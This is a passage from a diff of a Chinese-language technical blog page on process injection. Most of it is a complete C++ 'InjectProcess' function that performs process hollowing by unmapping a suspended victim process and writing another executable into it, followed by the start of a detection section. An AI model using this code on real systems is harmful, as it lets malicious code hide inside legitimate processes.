+<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">004</span> Mutant : Ptr<span class="hljs-number">32</span> Void
+<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">008</span> ImageBaseAddress : Ptr<span class="hljs-number">32</span> Void</code></pre></div>
 <p>示例代码：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">InjectProcess</span><span class="hljs-params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span><br><span class="hljs-function"></span>&#123;<br> HANDLE hFile;<br> DWORD dwFileSize;    <span class="hljs-comment">//文件大小</span><br> IMAGE_DOS_HEADER DosHeader;<br> IMAGE_NT_HEADERS NtHeader;<br> PROCESS_INFORMATION pi;<br> STARTUPINFO si;<br> CONTEXT context;<br> PVOID ImageBase;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ImageSize;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> BaseAddr;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> retByte = <span class="hljs-number">0</span>;<br> LONG offset;<br> HMODULE hNtDll=<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br> <span class="hljs-keyword">if</span>(!hNtDll)<br>  <span class="hljs-keyword">return</span> FALSE;<br> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="hljs-built_in">GetProcAddress</span>(hNtDll,<span class="hljs-string">&quot;ZwUnmapViewOfSection&quot;</span>);<br> <span class="hljs-built_in">memset</span>(&amp;si, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(si));<br> <span class="hljs-built_in">memset</span>(&amp;pi, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(pi));<br> si.cb = <span class="hljs-built_in">sizeof</span>(si);<br><br> hFile = ::<span class="hljs-built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="hljs-literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE)<br> &#123;<br>  <span class="hljs-keyword">return</span> FALSE;<br> &#125;<br> ::<span class="hljs-built_in">SetFilePointer</span>(hFile, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br> dwFileSize = ::<span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br> LPBYTE pBuf = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br> <span class="hljs-built_in">memset</span>(pBuf, <span class="hljs-number">0</span>, dwFileSize);<br> DWORD dwNumberOfBytesRead = <span class="hljs-number">0</span>;<br>    ::<span class="hljs-built_in">ReadFile</span>( hFile<br>        , pBuf<br>        , dwFileSize<br>        , &amp;dwNumberOfBytesRead<br>        , <span class="hljs-literal">NULL</span><br>        );<br><br> ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;DosHeader,pBuf,<span class="hljs-built_in">sizeof</span>(IMAGE_DOS_HEADER));<br> ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br> <span class="hljs-comment">//检查PE结构</span><br> <span class="hljs-comment">//以挂起方式进程</span><br> BOOL res = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>,VictimFile,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;si,&amp;pi); <br><br> <span class="hljs-keyword">if</span> (res)<br> &#123;<br>  context.ContextFlags = CONTEXT_FULL;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="hljs-comment">//如果调用失败</span><br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  <span class="hljs-built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>),&amp;BaseAddr,<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>),<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (!BaseAddr)<br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  <span class="hljs-comment">//拆卸傀儡进程内存模块</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ZwUnmapViewOfSection</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)pi.hProcess,BaseAddr))<br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  ImageBase = <span class="hljs-built_in">VirtualAllocEx</span>(pi.hProcess, <br>   (<span class="hljs-type">void</span> *)NtHeader.OptionalHeader.ImageBase,<br>   NtHeader.OptionalHeader.SizeOfImage, <br>   MEM_RESERVE|MEM_COMMIT, <br>   PAGE_EXECUTE_READWRITE);  <span class="hljs-comment">//ImageBase 0x00400000</span><br>  <span class="hljs-keyword">if</span> (ImageBase == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>   DWORD wrongFlag = <span class="hljs-built_in">GetLastError</span>();<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;  <br>  <span class="hljs-comment">//替换傀儡进程内存数据</span><br>  <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))<br>  &#123;<br>   DWORD wrongFlag2 = <span class="hljs-built_in">GetLastError</span>();  <br>  &#125;<br>  <span class="hljs-comment">//DOS 头 + PE 头 + 区块表的总大小</span><br>  <span class="hljs-comment">//定位到区块头</span><br>  offset = DosHeader.e_lfanew + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS);<br>  IMAGE_SECTION_HEADER secHeader;<br>  WORD i = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)<br>  &#123;<br>   <span class="hljs-comment">//定位到各个区块</span><br>   ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER));<br>   <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);<br>   <span class="hljs-built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);<br>  &#125;<br> <br>  context.ContextFlags = CONTEXT_FULL;<br>  <span class="hljs-comment">//重置 执行文件入口</span><br>  <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>), <br>   &amp;ImageBase,   <span class="hljs-comment">//4194304</span><br>   <span class="hljs-number">4</span>, &amp;retByte);<br>  context.Eax = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;<br>  <span class="hljs-built_in">SetThreadContext</span>(pi.hThread,&amp;context);<br>  <span class="hljs-built_in">ResumeThread</span>(pi.hThread);<br> &#125;<br> <br> <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br> <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br> ::<span class="hljs-built_in">CloseHandle</span>(hFile);  <br> <span class="hljs-keyword">delete</span>[] pBuf;<br> <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">InjectProcess</span><span class="hljs-params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span>
+<span class="hljs-function"></span>&#123;
+ HANDLE hFile;
+ DWORD dwFileSize;    <span class="hljs-comment">//文件大小</span>
+ IMAGE_DOS_HEADER DosHeader;
+ IMAGE_NT_HEADERS NtHeader;
+ PROCESS_INFORMATION pi;
+ STARTUPINFO si;
+ CONTEXT context;
+ PVOID ImageBase;
+ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ImageSize;
+ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> BaseAddr;
+ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> retByte = <span class="hljs-number">0</span>;
+ LONG offset;
+ HMODULE hNtDll=<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);
+ <span class="hljs-keyword">if</span>(!hNtDll)
+  <span class="hljs-keyword">return</span> FALSE;
+ ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="hljs-built_in">GetProcAddress</span>(hNtDll,<span class="hljs-string">&quot;ZwUnmapViewOfSection&quot;</span>);
+ <span class="hljs-built_in">memset</span>(&amp;si, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(si));
+ <span class="hljs-built_in">memset</span>(&amp;pi, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(pi));
+ si.cb = <span class="hljs-built_in">sizeof</span>(si);
+
+ hFile = ::<span class="hljs-built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="hljs-literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="hljs-literal">NULL</span>);
+ <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE)
+ &#123;
+  <span class="hljs-keyword">return</span> FALSE;
+ &#125;
+ ::<span class="hljs-built_in">SetFilePointer</span>(hFile, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, FILE_BEGIN);
+ dwFileSize = ::<span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);
+ LPBYTE pBuf = <span class="hljs-keyword">new</span> BYTE[dwFileSize];
+ <span class="hljs-built_in">memset</span>(pBuf, <span class="hljs-number">0</span>, dwFileSize);
+ DWORD dwNumberOfBytesRead = <span class="hljs-number">0</span>;
+    ::<span class="hljs-built_in">ReadFile</span>( hFile
+        , pBuf
+        , dwFileSize
+        , &amp;dwNumberOfBytesRead
+        , <span class="hljs-literal">NULL</span>
+        );
+
+ ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;DosHeader,pBuf,<span class="hljs-built_in">sizeof</span>(IMAGE_DOS_HEADER));
+ ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));
+ <span class="hljs-comment">//检查PE结构</span>
+ <span class="hljs-comment">//以挂起方式进程</span>
+ BOOL res = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>,VictimFile,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;si,&amp;pi); 
+
+ <span class="hljs-keyword">if</span> (res)
+ &#123;
+  context.ContextFlags = CONTEXT_FULL;
+  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="hljs-comment">//如果调用失败</span>
+  &#123;
+   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);
+   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);
+   <span class="hljs-keyword">return</span> FALSE;
+  &#125;
+  <span class="hljs-built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>),&amp;BaseAddr,<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>),<span class="hljs-literal">NULL</span>);
+  <span class="hljs-keyword">if</span> (!BaseAddr)
+  &#123;
+   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);
+   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);
+   <span class="hljs-keyword">return</span> FALSE;
+  &#125;
+  <span class="hljs-comment">//拆卸傀儡进程内存模块</span>
+  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ZwUnmapViewOfSection</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)pi.hProcess,BaseAddr))
+  &#123;
+   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);
+   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);
+   <span class="hljs-keyword">return</span> FALSE;
+  &#125;
+  ImageBase = <span class="hljs-built_in">VirtualAllocEx</span>(pi.hProcess, 
+   (<span class="hljs-type">void</span> *)NtHeader.OptionalHeader.ImageBase,
+   NtHeader.OptionalHeader.SizeOfImage, 
+   MEM_RESERVE|MEM_COMMIT, 
+   PAGE_EXECUTE_READWRITE);  <span class="hljs-comment">//ImageBase 0x00400000</span>
+  <span class="hljs-keyword">if</span> (ImageBase == <span class="hljs-literal">NULL</span>)
+  &#123;
+   DWORD wrongFlag = <span class="hljs-built_in">GetLastError</span>();
+   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);
+   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);
+   <span class="hljs-keyword">return</span> FALSE;
+  &#125;  
+  <span class="hljs-comment">//替换傀儡进程内存数据</span>
+  <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))
+  &#123;
+   DWORD wrongFlag2 = <span class="hljs-built_in">GetLastError</span>();  
+  &#125;
+  <span class="hljs-comment">//DOS 头 + PE 头 + 区块表的总大小</span>
+  <span class="hljs-comment">//定位到区块头</span>
+  offset = DosHeader.e_lfanew + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS);
+  IMAGE_SECTION_HEADER secHeader;
+  WORD i = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)
+  &#123;
+   <span class="hljs-comment">//定位到各个区块</span>
+   ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER));
+   <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);
+   <span class="hljs-built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);
+  &#125;
+ 
+  context.ContextFlags = CONTEXT_FULL;
+  <span class="hljs-comment">//重置 执行文件入口</span>
+  <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>), 
+   &amp;ImageBase,   <span class="hljs-comment">//4194304</span>
+   <span class="hljs-number">4</span>, &amp;retByte);
+  context.Eax = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;
+  <span class="hljs-built_in">SetThreadContext</span>(pi.hThread,&amp;context);
+  <span class="hljs-built_in">ResumeThread</span>(pi.hThread);
+ &#125;
+ 
+ <span class="hljs-built_in">CloseHandle</span>(pi.hThread);
+ <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);
+ ::<span class="hljs-built_in">CloseHandle</span>(hFile);  
+ <span class="hljs-keyword">delete</span>[] pBuf;
+ <span class="hljs-keyword">return</span> TRUE;
+&#125;</code></pre></div>
 
 <h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol>
 <li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li>
